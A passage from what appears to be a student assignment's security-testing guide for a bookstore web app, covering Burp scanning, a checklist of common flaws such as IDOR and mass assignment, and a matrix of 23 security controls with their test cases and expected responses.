   - Verify email
   - Login
   - Browse books
   - Add to cart/wishlist
   - Checkout
   - View profile
   - Admin dashboard
4. Burp passive scanner will flag issues automatically

### Automated Scan (Active)

1. Right-click any request in Proxy → "Do an active scan"
2. Burp will fuzz parameters for:
   - SQL injection
   - XSS
   - Path traversal
   - Command injection
   - XXE

### Key Things to Look For

| What to Check | How |
|---------------|-----|
| JWT in URL (shouldn't be) | Check if tokens appear in GET query params |
| Error disclosure | Trigger 500 errors, check for stack traces |
| Directory listing | Try `/uploads/`, `/api/`, `/admin/` |
| IDOR | Change user IDs in requests, see if you get others' data |
| Mass assignment | Add extra fields to requests, see if they're accepted |

---

## Summary Matrix

| # | Feature | Tool | Key Test | Expected Result |
|---|---------|------|----------|-----------------|
| 1 | RBAC | Postman/Burp | Customer accessing admin route | 403 Forbidden |
| 2 | MFA | Postman/Burp | Wrong TOTP code | 400 / 429 |
| 3 | CAPTCHA | Postman | No captchaToken | 400 Bad Request |
| 4 | Rate Limit | Postman/Burp | 21+ rapid requests | 429 Too Many |
| 5 | Password Policy | Postman | Weak password | 400 Validation |
| 6 | Email Verification | Postman | Login before verify | 401 Blocked |
| 7 | tokenVersion | Postman | Old token after pwd change | 401 Expired |
| 8 | Session Binding | Postman/Burp | Token from different UA | 401 Mismatch |
| 9 | Secure Cookies | Browser DevTools | Check cookie flags | HttpOnly, SameSite |
| 10 | JWT Expiry | Postman | Use expired token | 401 Invalid |
| 11 | Per-User RL | Postman/Burp | 65 cart requests | 429 on 61st |
| 12 | CORS | Postman/Burp | Wrong Origin header | No ACAO header |
| 13 | File Upload | Postman | >5MB file | 413 Too Large |
| 14 | SVG Sanitization | Postman | SVG with script tags | Cleaned output |
| 15 | XSS / Input Sanitization | Browser/Burp | Inject HTML in review comment | Rendered as text, not executed |
| 16 | OAuth Verify | Postman | Fake ID token | 401 Rejected |
| 17 | Audit Logging | Postman/Browser | Login events | Logged to DB |
| 18 | Password Reset | Postman | Invalid email | 200 (no enum) |
| 19 | IP Access | Postman/Browser | Blocked IP | 403 Denied |
| 20 | 401 Interceptor | Browser | Expired session | Redirect to /login |
| 21 | Data Export | Postman | Export endpoint | JSON/CSV download |
| 22 | IP Normalization | Postman/Browser | Check IP display in admin | ::ffff: prefix stripped |
| 23 | Recent Sessions | Browser | One-click allow/block | Rule created immediately |

---

*Use this guide to systematically verify each security control. For the assignment report, capture screenshots of both the "before" (exploit working) and "after" (exploit blocked) states for all 13 CVSS-rated bugs.*
